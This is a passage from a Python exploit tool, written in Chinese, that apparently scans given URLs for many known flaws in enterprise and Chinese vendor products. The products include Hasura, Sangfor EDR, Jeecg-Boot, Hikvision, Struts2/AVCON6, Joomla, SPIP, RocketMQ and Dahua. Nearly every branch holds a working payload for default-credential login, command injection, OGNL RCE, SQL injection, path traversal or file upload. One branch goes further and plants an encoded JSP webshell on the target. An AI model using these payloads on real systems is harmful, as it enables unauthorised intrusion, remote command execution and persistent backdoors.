        payload = "name=admin&password=zxsoft1234!%40%23%24&checkcode=ptbh&doLoginSubmit=1"  # Replace "filename" with the desired filename

        try:
            req = requests.post(encodetext, data=payload, headers=headers, timeout=20, proxies=proxies)
            res = req.text
            # if req.status_code == 200 and "1" in res and "ZXSOFT_JDIS_USR_NAME=deleted" in res:
            if req.status_code == 200 and "1" in res:
                append_to_output(f"[+] {url} 存在中新金盾信息安全管理系统默认口令！！！！", "red")
                append_to_output(res, "yellow")
                with open("output.txt", "a") as file:
                    file.write(f"[+] {url} 存在中新金盾信息安全管理系统默认口令！！！！" + "\n")
                    file.write(res + "\n")
            else:
                append_to_output(f"[-] {url} 不存在中新金盾信息安全管理系统默认口令", "green")
        except requests.Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except requests.ConnectionError as conn_err:
            append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
        except Exception as e:
            if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
            else:
                append_to_output(str(e), "yellow")
    if vulnerability == "23.Hasura GraphQL Engine远程命令执行漏洞":
        if url.endswith("/"):
            path = "v1/query"
        else:
            path = "/v1/query"

        if not url.startswith('http://') and not url.startswith('https://'):
            url = 'http://' + url

        encodetext = url + path
        headers = {
            "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
            "Accept": "*/*",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        data = {
            "type": "bulk",
            "args": [
                {
                    "type": "run_sql",
                    "args": {
                        "sql": "SET LOCAL statement_timeout = 10000;",
                        "cascade": False,
                        "read_only": False
                    }
                },
                {
                    "type": "run_sql",
                    "args": {
                        "sql": "DROP TABLE IF EXISTS cmd_exec;\nCREATE TABLE cmd_exec(cmd_output text);\nCOPY cmd_exec FROM PROGRAM 'id';\nSELECT * FROM cmd_exec;",
                        "cascade": False,
                        "read_only": False
                    }
                }
            ]
        }
        try:
            req = requests.post(encodetext, data=json.dumps(data), headers=headers, timeout=5, proxies=proxies)
            res = req.text
            # if req.status_code == 200 and "1" in res and "ZXSOFT_JDIS_USR_NAME=deleted" in res:
            if req.status_code == 200:
                append_to_output(f"[+] {url} 存在Hasura GraphQL Engine远程命令执行漏洞！！！！", "red")
                append_to_output(res, "yellow")
                with open("output.txt", "a") as file:
                    file.write(f"[+] {url} 存在Hasura GraphQL Engine远程命令执行漏洞！！！！" + "\n")
                    file.write(res + "\n")
            else:
                append_to_output(f"[-] {url} 不存在Hasura GraphQL Engine远程命令执行漏洞", "green")
        except requests.Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except requests.ConnectionError as conn_err:
            append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
        except Exception as e:
            if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
            else:
                append_to_output(str(e), "yellow")

    if vulnerability == "25.深信服EDR命令执行(CNVD-2020-46552)":
        if url.endswith("/"):
            path = "tool/log/c.php?strip_slashes=system&host=id"
        else:
            path = "/tool/log/c.php?strip_slashes=system&host=id"

        if not url.startswith('http://') and not url.startswith('https://'):
            url = 'http://' + url

        encodetext = url + path
        headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0"
        }
        try:
            req = requests.get(encodetext, verify=False, allow_redirects=False, timeout=20, proxies=proxies)
            res = req.text

            if req.status_code == 200 and 'uid=' in res:
                append_to_output(f"[+] {url} 存在深信服EDR命令执行(CNVD-2020-46552)！！！！", "red")
                append_to_output(res, "yellow")
                with open("output.txt", "a") as file:
                    file.write(f"[+] {url} 存在深信服EDR命令执行(CNVD-2020-46552)！！！！" + "\n")
                    file.write(res + "\n")
            else:
                append_to_output(f"[-] {url} 不存在深信服EDR命令执行(CNVD-2020-46552)", "green")
        except requests.Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except requests.ConnectionError as conn_err:
            append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
        except Exception as e:
            if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
            else:
                append_to_output(str(e), "yellow")
    if vulnerability == "26.Jeecg-Boot前台SQL注入漏洞(CVE-2023-1454)":
        if url.endswith("/"):
            path = "jeecg-boot/jmreport/qurestSql"
        else:
            path = "/jeecg-boot/jmreport/qurestSql"

        if not url.startswith('http://') and not url.startswith('https://'):
            url = 'http://' + url

        encodetext = url + path
        headers = {
            "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
            "Accept-Encoding": "gzip, deflate",
            "Accept": "*/*",
            "Connection": "close",
            "Content-Type": "application/json"
        }
        payload = {
            "apiSelectId": "1316997232402231298",
            "id": "1' or '%1%' like (updatexml(0x3a,concat(1,(select database())),1)) or '%%' like '"
        }

        # Convert payload to JSON
        json_payload = json.dumps(payload)
        # proxies
        try:
            req = requests.post(encodetext, data=json_payload, headers=headers, timeout=5, proxies=proxies)
            res = req.text
            if req.status_code == 200 and 'XPATH' in res:
                append_to_output(f"[+] {url} 存在Jeecg-Boot前台SQL注入漏洞(CVE-2023-1454)！！！！", "red")
                append_to_output(res, "yellow")
                with open("output.txt", "a") as file:
                    file.write(f"[+] {url} 存在Jeecg-Boot前台SQL注入漏洞(CVE-2023-1454)！！！！" + "\n")
                    file.write(res + "\n")
            else:
                append_to_output(f"[-] {url} 不存在Jeecg-Boot前台SQL注入漏洞(CVE-2023-1454)", "green")
        except requests.Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except requests.ConnectionError as conn_err:
            append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
        except Exception as e:
            if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
            else:
                append_to_output(str(e), "yellow")
    if vulnerability == "27.HIKVISION-海康威视isecure center 综合安防管理平台任意文件上传漏洞":
        if url.endswith("/"):
            path = "center/api/files;.js"
        else:
            path = "/center/api/files;.js"

        if not url.startswith('http://') and not url.startswith('https://'):
            url = 'http://' + url

        encodetext = url + path
        headers = {
            "User-Agent": "python-requests/2.26.0",
            "Accept-Encoding": "gzip, deflate",
            "Accept": "*/*",
            "Connection": "close",
            "Content-Type": "multipart/form-data; boundary=ea26cdac4990498b32d7a95ce5a5135c"
        }
        payload = """
        --ea26cdac4990498b32d7a95ce5a5135c
        Content-Disposition: form-data; name="file"; filename="../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/153107606.txt"
        Content-Type: application/octet-stream

        332299402
        --ea26cdac4990498b32d7a95ce5a5135c--
        """

        # Convert payload to JSON
        json_payload = json.dumps(payload)

        try:

            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
            req = requests.post(encodetext, data=payload, headers=headers, timeout=5, proxies=proxies)
            res = req.text
            if req.status_code == 200:
                append_to_output(f"[+] {url} 存在海康威视isecure center 综合安防管理平台任意文件上传漏洞！！！！",
                                 "red")
                append_to_output(res, "yellow")
                with open("output.txt", "a") as file:
                    file.write(f"[+] {url} 存在海康威视isecure center 综合安防管理平台任意文件上传漏洞！！！！" + "\n")
                    file.write(res + "\n")
            else:
                append_to_output(f"[-] {url} 不存在海康威视isecure center 综合安防管理平台任意文件上传漏洞",
                                 "green")
        except requests.Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except requests.ConnectionError as conn_err:
            append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
        except Exception as e:
            if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
            else:
                append_to_output(str(e), "yellow")
    if vulnerability == "28.PowerJob未授权访问漏洞(CVE-2023-29922)":
        if url.endswith("/"):
            path = "job/list"
        else:
            path = "/job/list"

        if not url.startswith('http://') and not url.startswith('https://'):
            url = 'http://' + url

        encodetext = url + path
        header = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.69',
            'Content-Type': 'application/json;charset=UTF-8',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6'
        }
        data = {
            "appId": 1,
            "index": 0,
            "pageSize": 10
        }

        try:

            # urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
            req = requests.post(encodetext, json=data, headers=header, verify=False, timeout=5, proxies=proxies)
            res = req.text
            if req.status_code == 200:
                append_to_output(f"[+] {url} 存在PowerJob未授权访问漏洞(CVE-2023-29922)洞！！！！", "red")
                append_to_output(res, "yellow")
                with open("output.txt", "a") as file:
                    file.write(f"[+] {url} 存在PowerJob未授权访问漏洞(CVE-2023-29922)！！！！" + "\n")
                    file.write(res + "\n")
            else:
                append_to_output(f"[-] {url} 不存在PowerJob未授权访问漏洞(CVE-2023-29922)", "green")
        except requests.Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except requests.ConnectionError as conn_err:
            append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
        except Exception as e:
            if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
            else:
                append_to_output(str(e), "yellow")
    if vulnerability == "29.浙江宇视科技 网络视频录像机远程命令执行漏洞":
        if url.endswith("/"):
            path = "Interface/LogReport/LogReport.php?action=execUpdate&fileString=x%3bwhoami%3e1.txt"
        else:
            path = "/Interface/LogReport/LogReport.php?action=execUpdate&fileString=x%3bwhoami%3e1.txt"

        if not url.startswith('http://') and not url.startswith('https://'):
            url = 'http://' + url

        encodetext = url + path
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36",
            "Accept": "*/*",
            "Accept-Language": "en",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "close"
        }
        try:
            req = requests.get(encodetext, headers=headers, timeout=5, proxies=proxies)
            res = req.text

            if req.status_code == 200:
                if url.endswith("/"):
                    path = "Interface/LogReport/1.txt"
                else:
                    path = "/Interface/LogReport/1.txt"

                if not url.startswith('http://') and not url.startswith('https://'):
                    url = 'http://' + url
                encodetext = url + path
                try:
                    req = requests.get(encodetext, headers=headers, timeout=5, proxies=proxies)
                    res = req.text
                    if req.status_code == 200:
                        append_to_output(f"[+] {url} 存在浙江宇视科技 网络视频录像机远程命令执行漏洞！！！！", "red")
                        append_to_output(res, "yellow")
                    else:
                        append_to_output(f"[-] {url} 不存在浙江宇视科技 网络视频录像机远程命令执行漏洞", "green")
                except Timeout:
                    append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                except Exception as e:
                    append_to_output(str(e))
            else:
                append_to_output(f"[-] {url} 不存在浙江宇视科技 网络视频录像机远程命令执行漏洞", "green")
        except requests.Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except requests.ConnectionError as conn_err:
            append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
        except Exception as e:
            if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
            else:
                append_to_output(str(e), "yellow")
    if vulnerability == "30.华平信息AVCON6系统管理平台strut2远程代码执行漏洞":
        if url.endswith("/"):
            path = 'login.action?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{"id"})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}%20GET%20/login.action?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{"id"})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}'
        else:
            path = '/login.action?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{"id"})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}%20GET%20/login.action?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{"id"})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}'

        if not url.startswith('http://') and not url.startswith('https://'):
            url = 'http://' + url

        encodetext = url + path

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36",
            "Accept": "*/*",
            "Accept-Language": "en",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "close"
        }
        try:
            req = requests.get(encodetext, headers=headers, timeout=5, proxies=proxies)
            res = req.text

            if req.status_code == 200:
                append_to_output(f"[+] {url} 存在华平信息AVCON6系统管理平台strut2远程代码执行漏洞！！！！", "red")
                append_to_output(res, "yellow")
                with open("output.txt", "a") as file:
                    file.write(f"[+] {url} 存在华平信息AVCON6系统管理平台strut2远程代码执行漏洞！！！！" + "\n")
                    file.write(res + "\n")
            else:
                append_to_output(f"[-] {url} 不存在华平信息AVCON6系统管理平台strut2远程代码执行漏洞", "green")
        except requests.Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except requests.ConnectionError as conn_err:
            append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
        except Exception as e:
            if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
            else:
                append_to_output(str(e), "yellow")
    if vulnerability == "31.Joomla3.7Corecom_fields组件sql注入漏洞(CVE-2017-8917)":
        if url.endswith("/"):
            path = 'Joomla/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(0x7e,concat(0x7e,user()),0x7e)'
        else:
            path = '/Joomla/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(0x7e,concat(0x7e,user()),0x7e)'

        if not url.startswith('http://') and not url.startswith('https://'):
            url = 'http://' + url

        encodetext = url + path
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36",
            "Accept": "*/*",
            "Accept-Language": "en",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "close"
        }
        try:
            req = requests.get(encodetext, headers=headers, timeout=5, proxies=proxies)
            res = req.text

            if 'XPATH' in res:
                append_to_output(f"[+] {url} 存在Joomla3.7Corecom_fields组件sql注入漏洞(CVE-2017-8917)！！！！", "red")
                append_to_output(res, "yellow")
                with open("output.txt", "a") as file:
                    file.write(f"[+] {url} 存在Joomla3.7Corecom_fields组件sql注入漏洞(CVE-2017-8917)！！！！" + "\n")
                    file.write(res + "\n")
            else:
                append_to_output(f"[-] {url} 不存在Joomla3.7Corecom_fields组件sql注入漏洞(CVE-2017-8917)", "green")
        except requests.Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except requests.ConnectionError as conn_err:
            append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
        except Exception as e:
            if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
            else:
                append_to_output(str(e), "yellow")
    if vulnerability == "32.狮子鱼CMS":
        if url.endswith("/"):
            path = 'and%20updatexml(1,concat(0x7e,database(),0x7e),1)'
        else:
            path = '/and%20updatexml(1,concat(0x7e,database(),0x7e),1)'

        if not url.startswith('http://') and not url.startswith('https://'):
            url = 'http://' + url

        encodetext = url + path

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36",
            "Accept": "*/*",
            "Accept-Language": "en",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "close"
        }
        try:
            req = requests.get(encodetext, headers=headers, timeout=5, proxies=proxies)
            res = req.text

            if 'XPATH' in res:
                append_to_output(f"[+] {url} 存在狮子鱼CMS！！！！", "red")
                append_to_output(res, "yellow")
                with open("output.txt", "a") as file:
                    file.write(f"[+] {url} 存在狮子鱼CMS！！！！" + "\n")
                    file.write(res + "\n")
            else:
                append_to_output(f"[-] {url} 不存在狮子鱼CMS", "green")
        except requests.Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except requests.ConnectionError as conn_err:
            append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
        except Exception as e:
            if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
            else:
                append_to_output(str(e), "yellow")
    if vulnerability == "33.新开普智慧校园系统RCE漏洞":
        if url.endswith("/"):
            path = 'service_transport/service.action'
        else:
            path = '/service_transport/service.action'

        if not url.startswith('http://') and not url.startswith('https://'):
            url = 'http://' + url

        encodetext = url + path
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36",
            "Accept": "*/*",
            "Accept-Language": "en",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "close"
        }
        try:
            req = requests.get(encodetext, headers=headers, timeout=5, proxies=proxies)
            res = req.text

            if 'message' in res:
                append_to_output(f"[+] {url} 存在新开普智慧校园系统RCE漏洞！！！！", "red")
                append_to_output(res, "yellow")
                with open("output.txt", "a") as file:
                    file.write(f"[+] {url} 存在新开普智慧校园系统RCE漏洞！！！！" + "\n")
                    file.write(res + "\n")
                data = {
                    'command': 'GetFZinfo',
                    'UnitCode': '<#assign ex = "freemarker.template.utility.Execute"?new()>${ex("cmd /c echo PCUhCiAgICBjbGFzcyBVIGV4dGVuZHMgQ2xhc3NMb2FkZXIgewogICAgICAgIFUoQ2xhc3NMb2FkZXIgYykgewogICAgICAgICAgICBzdXBlcihjKTsKICAgICAgICB9CiAgICAgICAgcHVibGljIENsYXNzIGcoYnl0ZVtdIGIpIHsKICAgICAgICAgICAgcmV0dXJuIHN1cGVyLmRlZmluZUNsYXNzKGIsIDAsIGIubGVuZ3RoKTsKICAgICAgICB9CiAgICB9CiAKICAgIHB1YmxpYyBieXRlW10gYmFzZTY0RGVjb2RlKFN0cmluZyBzdHIpIHRocm93cyBFeGNlcHRpb24gewogICAgICAgIHRyeSB7CiAgICAgICAgICAgIENsYXNzIGNsYXp6ID0gQ2xhc3MuZm9yTmFtZSgic3VuLm1pc2MuQkFTRTY0RGVjb2RlciIpOwogICAgICAgICAgICByZXR1cm4gKGJ5dGVbXSkgY2xhenouZ2V0TWV0aG9kKCJkZWNvZGVCdWZmZXIiLCBTdHJpbmcuY2xhc3MpLmludm9rZShjbGF6ei5uZXdJbnN0YW5jZSgpLCBzdHIpOwogICAgICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiBlKSB7CiAgICAgICAgICAgIENsYXNzIGNsYXp6ID0gQ2xhc3MuZm9yTmFtZSgiamF2YS51dGlsLkJhc2U2NCIpOwogICAgICAgICAgICBPYmplY3QgZGVjb2RlciA9IGNsYXp6LmdldE1ldGhvZCgiZ2V0RGVjb2RlciIpLmludm9rZShudWxsKTsKICAgICAgICAgICAgcmV0dXJuIChieXRlW10pIGRlY29kZXIuZ2V0Q2xhc3MoKS5nZXRNZXRob2QoImRlY29kZSIsIFN0cmluZy5jbGFzcykuaW52b2tlKGRlY29kZXIsIHN0cik7CiAgICAgICAgfQogICAgfQolPgo8JQogICAgU3RyaW5nIGNscyA9IHJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJwYXNzd2QiKTsKICAgIGlmIChjbHMgIT0gbnVsbCkgewogICAgICAgIG5ldyBVKHRoaXMuZ2V0Q2xhc3MoKS5nZXRDbGFzc0xvYWRlcigpKS5nKGJhc2U2NERlY29kZShjbHMpKS5uZXdJbnN0YW5jZSgpLmVxdWFscyhwYWdlQ29udGV4dCk7CiAgICB9CiU+ >./webapps/ROOT/1.txt")}'
                }
                response = requests.post(encodetext, headers=headers, json=data, timeout=10, proxies=proxies)
                nowres = response.text
                if response.status_code == 200:
                    append_to_output(f"[+] {url} 新开普智慧校园系统RCE上传成功！！！！", "red")
                    append_to_output(nowres, "yellow")
                else:
                    append_to_output(f"[-] {url} 新开普智慧校园系统RCE上传失败", "red")
            else:
                append_to_output(f"[-] {url} 不存在新开普智慧校园系统RCE漏洞", "green")
        except requests.Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except requests.ConnectionError as conn_err:
            append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
        except Exception as e:
            if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
            else:
                append_to_output(str(e), "yellow")
    if vulnerability == "34.SPIP远程代码执行漏洞(CVE-2023-27372)":
        if url.endswith("/"):
            path = "spip.php?page=spip_pass"
        else:
            path = "/spip.php?page=spip_pass"

        if not url.startswith('http://') and not url.startswith('https://'):
            url = 'http://' + url

        encodetext = url + path
        header = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": "application/x-www-form-urlencoded",
            "Upgrade-Insecure-Requests": "1"
        }

        data = {
            "page": "spip_pass",
            "formulaire_action": "oubli",
            "formulaire_action_args": "CSRF_TOKEN",
            "oubli": 's:19:"<?php system(whoami); ?>";',
            "nobot": ""
        }

        try:

            # urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
            req = requests.post(encodetext, data=data, headers=header, verify=False, timeout=5, proxies=proxies)
            res = req.text
            if req.status_code == 200:
                append_to_output(f"[+] {url} 存在SPIP远程代码执行漏洞(CVE-2023-27372)！！！！", "red")
                append_to_output(res, "yellow")
                with open("output.txt", "a") as file:
                    file.write(f"[+] {url} 存在SPIP远程代码执行漏洞(CVE-2023-27372)！！！！" + "\n")
                    file.write(res + "\n")
            else:
                append_to_output(f"[-] {url} 不存在SPIP远程代码执行漏洞(CVE-2023-27372)", "green")
        except requests.Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except requests.ConnectionError as conn_err:
            append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
        except Exception as e:
            if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
            else:
                append_to_output(str(e), "yellow")
    if vulnerability == "35.Apache RocketMQ远程命令执行漏洞(CVE-2023-37582)":
        # if not url.startswith('http://') and not url.startswith('https://'):
        #    url = 'http://' + url

        hostname = url
        data_base64 = "AAAA0AAAALJ7ImNvZGUiOjMxOCwiZXh0RmllbGRzIjp7IkFjY2Vzc0tleSI6InJvY2tldG1xMiIsIlNpZ25hdHVyZSI6ImNHSmpxMUZCTSs0VUJsUnNORE50azBVOW5EMD0ifSwiZmxhZyI6MCwibGFuZ3VhZ2UiOiJKQVZBIiwib3BhcXVlIjowLCJzZXJpYWxpemVUeXBlQ3VycmVudFJQQyI6IkpTT04iLCJ2ZXJzaW9uIjo0MzV9dGhpc19pc19rZXk9dGhpc19pc192YWx1ZQo="
        data = base64.b64decode(data_base64)

        try:
            # 创建socket连接
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_address = (hostname, 9876)
            sock.settimeout(5)
            sock.connect(server_address)

            # 发送请求
            # request_data = bytes(data, "utf-8")
            sock.send(data)

            # 接收响应
            sock.settimeout(10)
            response_data = sock.recv(1024)
            response = response_data.decode("utf-8")

            # 关闭连接
            sock.close()

            # 处理响应
            if '"code":0' in response and 'serializeTypeCurrentRPC' in response:
                append_to_output(f"[+] {url} 存在Apache RocketMQ远程命令执行漏洞(CVE-2023-37582)！！！！", "red")
                append_to_output(response, "yellow")
                # with open("output.txt", "a") as file:
                #    file.write(f"[+] {url} 存在Apache RocketMQ远程命令执行漏洞(CVE-2023-37582)！！！！" + "\n")
                #    file.write(response + "\n")
            else:
                append_to_output(f"[-] {url} 不存在Apache RocketMQ远程命令执行漏洞(CVE-2023-37582)", "green")
        except socket.timeout:
            append_to_output(f"[!] 请求超时，跳过主机: {hostname}", "yellow")
        except Exception as e:
            append_to_output(str(e))
    if vulnerability == "36.大华智慧园区综合管理平台RCE漏洞":
        if url.endswith("/"):
            path = "emap/devicePoint_addImgIco?hasSubsystem=true"
        else:
            path = "/emap/devicePoint_addImgIco?hasSubsystem=true"

        if not url.startswith('http://') and not url.startswith('https://'):
            url = 'http://' + url

        encodetext = url + path

        headers = {
            "Content-Type": "multipart/form-data; boundary=A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0"
        }

        data = '''--A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT\r\nContent-Disposition: form-data; name="upload"; filename="a.jsp"\r\nContent-Type: application/octet-stream\r\nContent-Transfer-Encoding: binary\r\n\r\ntest123\r\n--A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT--'''

        try:

            # urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
            req = requests.post(encodetext, headers=headers, data=data, verify=False, timeout=10, proxies=proxies)
            res = req.text
            if req.status_code == 200:
                append_to_output(f"[+] {url} 存在大华智慧园区综合管理平台RCE漏洞！！！！", "red")
                append_to_output(res, "yellow")
                with open("output.txt", "a") as file:
                    file.write(f"[+] {url} 存在大华智慧园区综合管理平台RCE漏洞！！！！" + "\n")
                    file.write(res + "\n")
                response_data = json.loads(req.text)
                data_value = response_data.get("data")
                if data_value:
                    append_to_output(f"[+] 回显的jsp文件名:  {data_value} ", "yellow")
                    new_port = "8314"
                    pattern = r":\d+"
                    new_url = re.sub(pattern, ":" + new_port, url)
                    if new_url.endswith("/"):
                        newpath = "upload/emap/society_new/"
                    else:
                        newpath = "/upload/emap/society_new/"
                    end_newpath = new_url + newpath + data_value
                    print(end_newpath)
                    append_to_output(f"[+] 构造新的URL:  {end_newpath} ", "yellow")
                    try:
                        newreq = requests.get(end_newpath, timeout=10, verify=False, proxies=proxies)
                        newres = newreq.text
                        if newreq.status_code == 200 and 'code' in newres:
                            append_to_output(f"[+] {newres} 确认无误,存在漏洞！！！！", "yellow")
                        else:
                            append_to_output(f"[+] {newres} 可能不存在漏洞！！！！", "yellow")
                    except Timeout:
                        append_to_output(f"[!] 寻找test123文件请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        append_to_output(str(e))
                else:
                    append_to_output("[-] 无法获取回显的jsp文件名", "red")
            else:
                append_to_output(f"[-] {url} 不存在大华智慧园区综合管理平台RCE漏洞", "green")
        except requests.Timeout:
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        except requests.ConnectionError as conn_err:
            append_to_output(f"[!] 连接错误: {conn_err}", "yellow")
        except Exception as e:
            if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
            else:
                append_to_output(str(e), "yellow")
    if vulnerability == "37.艾科思应用接入系统存在任意文件读取漏洞":
        if url.endswith("/"):
            path = '..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/windows/win.ini'
        else:
            path = '/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/windows/win.ini'

        if not url.startswith('http://') and not url.startswith('https://'):
